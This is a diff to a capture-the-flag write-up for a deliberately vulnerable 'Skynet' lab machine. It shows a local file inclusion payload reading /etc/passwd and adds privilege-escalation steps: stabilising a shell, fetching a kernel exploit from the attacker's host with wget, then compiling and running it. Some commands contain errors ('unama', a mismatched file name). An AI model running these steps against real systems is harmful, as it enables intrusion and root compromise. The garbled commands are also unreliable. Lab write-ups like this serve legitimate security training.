@@ -1,4 +1,4 @@
-#Linux #SMB  # 
+#Linux #SMB #RFI
 
 skynet: A vulnerable Terminator themed Linux machine
 
@@ -35,7 +35,7 @@ gobuster dir -u=http://10.10.14.219 -w /usr/share/seclists/Discovery/Web-Content
 
 ![image](https://user-images.githubusercontent.com/99097743/170731438-021c0087-aea6-46a2-8c6a-3cb0c93ba632.png)
 
-This analysis takes a while. The following directories were listed in the first few minutes:
+This analysis takes a while. The following directories were listed after the first few minutes:
 
 * /admin (Status 301)
 * /css (Status 301)
@@ -93,7 +93,7 @@ We now have access to the email account!
 
 ![image](https://user-images.githubusercontent.com/99097743/170765416-03b102ff-c975-4637-a994-d061991061c4.png)
 
-There is a Samba Password Reset email providing a new password. We can use the credentials to login the SMB share and see that there is a document, entitled important.txt. Here, it reveals the 'hidden directory'. Gobuster suggests that there is another hidden directry as /administrator, please see the figure below. 
+There is a Samba Password Reset email providing a new password. We can use the credentials to login the SMB share and see that there is a document titled **important.txt**. Here, it reveals an 'hidden directory'. Gobuster suggests that there is another hidden directory as **/administrator**, please see the figure below. 
 
 ![image](https://user-images.githubusercontent.com/99097743/170796322-835a1ab6-695b-442d-b8d6-5b48d7cfc906.png)
 
@@ -105,7 +105,7 @@ Now, let's go to **searchsploit** and search if there is any vulnerability docum
 ```sh
   searchsploit -m php/webapps/25971.txt
   #VULNERABILITY: PHP CODE INJECTION
-  An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+  #An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
   
   # We basically include the following link:
   /alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
@@ -148,10 +148,45 @@ This picture gives an overall summary of the steps followed:
 
 ![Screenshot 2022-05-27 191059](https://user-images.githubusercontent.com/99097743/170802509-703b2ac1-1a5c-4edc-a61e-c0b925793b0f.png)
 
+Next step is stabilizing the shell!
+
+```sh
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+```
+
+**Privilege Escalation**
+
+Here, I followed the procedure explained in the following reference: https://ratiros01.medium.com/tryhackme-skynet-bdce0537fe7d
+
+Step 1: Find kernel version
+
+```sh
+unama -a
+ ```
+![image](https://user-images.githubusercontent.com/99097743/170807309-ab99c440-a476-46af-87e8-6663f2fc82d5.png)
+
+Step 2: Search for kernel exploits
+
+![image](https://user-images.githubusercontent.com/99097743/170807403-c0b55136-2857-4e10-bdba-22d2bf56802c.png)
 
 
+```sh
+searchsploit linux kernel 4.8.0
 
+searchsploit -m linux/local/43418.c
+# File copied to the directory
 
+wget http://10.18.123.93/43418.c
+# Transfered to the target machine
 
-Let's stabilize the shell!
+#Commands to execute
+gcc pwn.c -o pwn
+./pwn
 
+```
+
+![image](https://user-images.githubusercontent.com/99097743/170808147-1f097557-f1ce-4067-a194-b50365d6ccaa.png)
